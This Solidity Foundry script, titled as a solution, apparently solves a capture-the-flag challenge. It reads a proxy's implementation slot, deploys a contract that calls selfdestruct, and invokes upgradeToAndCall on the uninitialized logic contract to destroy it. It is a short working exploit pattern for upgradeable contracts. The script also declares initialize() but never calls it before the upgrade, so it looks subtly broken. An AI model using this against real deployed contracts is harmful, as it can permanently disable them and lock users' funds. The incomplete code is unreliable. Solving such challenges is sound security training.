// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import "./BaseScript.s.sol";
import { console2 } from "forge-std/console2.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function _authorizeUpgrade() external view;
    function _upgradeToAndCall(address newImplementation, bytes memory data) external;
    function _setImplementation(address newImplementation) external;
}

contract Attack {
    function killed() public {
        selfdestruct(address(0));
    }
}

contract Solution is BaseScript {
    Attack public att;
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public contractAdd = 0xD0333097b58238552E591cAc72a0077dbfaEd315;

    IEngine engineAddress = IEngine(address(uint160(uint256(vm.load(contractAdd, _IMPLEMENTATION_SLOT)))));
    function run() external{
        vm.startBroadcast(deployer);

        att = new Attack();

        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(address(att), encodedData);
        vm.stopBroadcast();
    }
}
